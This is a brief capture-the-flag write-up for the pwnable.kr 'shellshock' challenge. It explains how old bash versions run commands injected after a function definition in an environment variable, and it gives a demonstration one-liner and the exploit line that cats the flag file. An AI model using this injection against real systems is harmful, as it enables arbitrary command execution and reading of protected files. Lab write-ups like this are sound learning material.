# pwnable.kr: shellshock

Older versions of bash handled function definitions in environments incorrectly, such that arbitrary commands could be injected into an environment variable and executed.

For example: `env x='() { :;}; echo pwned' bash -c "echo test"` will run the command `echo pwned`. Note that `() { :;};` is a perfectly normal function definition.

Exploit: `x='() { :;}; /bin/cat flag' ./shellshock`
